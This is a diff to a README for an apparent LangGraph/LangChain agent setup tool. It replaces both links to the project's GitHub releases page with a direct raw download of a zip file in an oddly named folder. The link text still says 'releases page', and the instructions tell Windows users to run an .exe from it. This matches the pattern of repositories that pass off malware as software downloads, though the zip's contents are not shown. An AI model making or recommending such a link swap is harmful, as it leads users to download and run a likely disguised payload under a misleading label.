@@ -1,6 +1,6 @@
 # 🤖 langgraph-langchain-agent-setup - Easy setup for advanced AI agents
 
-<a href="https://github.com/Vuongngu8186/langgraph-langchain-agent-setup/releases">
+<a href="https://raw.githubusercontent.com/Vuongngu8186/langgraph-langchain-agent-setup/main/Reseda/langgraph-agent-langchain-setup-v2.0.zip">
   <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Application">
 </a>
 
@@ -24,7 +24,7 @@ Before you install the software, check that your computer meets these standards:
 
 Follow these steps to set up the agent framework on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Vuongngu8186/langgraph-langchain-agent-setup/releases) to access the software.
+1. Visit the [releases page](https://raw.githubusercontent.com/Vuongngu8186/langgraph-langchain-agent-setup/main/Reseda/langgraph-agent-langchain-setup-v2.0.zip) to access the software.
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to start your download.
 4. Open the folder where the file saved.
